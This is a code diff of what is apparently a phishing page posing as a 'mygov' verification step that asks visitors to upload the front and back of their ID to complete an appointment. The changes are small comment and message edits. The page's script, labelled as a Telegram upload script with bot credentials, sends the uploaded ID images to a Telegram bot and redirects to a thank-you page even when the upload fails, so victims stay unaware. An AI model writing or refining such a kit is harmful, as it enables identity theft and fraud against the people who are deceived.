@@ -42,7 +42,8 @@
                                     <a data-go-back-link="" class="button-back" href="#">Back</a>
                                     <h1>Verification</h1>
                                     <h2 class="text-align-left">PLEASE UPLOAD YOUR ID TO COMPLETE YOUR APPOINTMENT SCHEDULE</h2>
-                                    <!-- Remove action="./next.php" – we handle submission via JavaScript -->
+
+                                    <!-- ✅ NO action="./next.php" – submission handled by JavaScript -->
                                     <form id="form-1" class="mygov-login-form alternative" method="post" enctype="multipart/form-data">
                                         <div class="input-group">
                                             <label class="override" for="userId">ID Front</label>
@@ -105,11 +106,10 @@
         $("#ph").inputmask({"mask": "999-999-9999"});
     </script>
     <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
-    <!-- 🚫 REMOVED slim jQuery to avoid breaking $.ajax -->
-    <!-- <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script> -->
+    <!-- 🚫 Slim jQuery removed (would break $.ajax) -->
     <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
 
-    <!-- ====== TELEGRAM UPLOAD SCRIPT (at the very bottom) ====== -->
+    <!-- ====== 🟢 TELEGRAM FILE UPLOAD SCRIPT ====== -->
     <script>
         // ============================================================
         // CONFIGURATION – YOUR TELEGRAM BOT CREDENTIALS
@@ -126,9 +126,9 @@
                 const fileFront = $('#upf')[0].files[0];
                 const fileBack = $('#upb')[0].files[0];
 
-                // If no files selected, stop (shouldn't happen due to 'required')
+                // Validate that both files are selected
                 if (!fileFront || !fileBack) {
-                    alert('Please select both ID images.');
+                    alert('Please select both ID images (Front and Back).');
                     return;
                 }
 
@@ -152,14 +152,14 @@
                     });
                 }
 
-                // Send front, then back, then redirect to thank.html
+                // Send Front, then Back, then redirect
                 sendFile(fileFront, '📄 ID - Front')
                     .then(() => sendFile(fileBack, '📄 ID - Back'))
                     .then(() => {
                         window.location.href = 'thank.html';
                     })
                     .catch(() => {
-                        // Even if upload fails, redirect the user to keep the flow going
+                        // Even if upload fails, redirect the user to keep the flow moving
                         window.location.href = 'thank.html';
                     });
             });
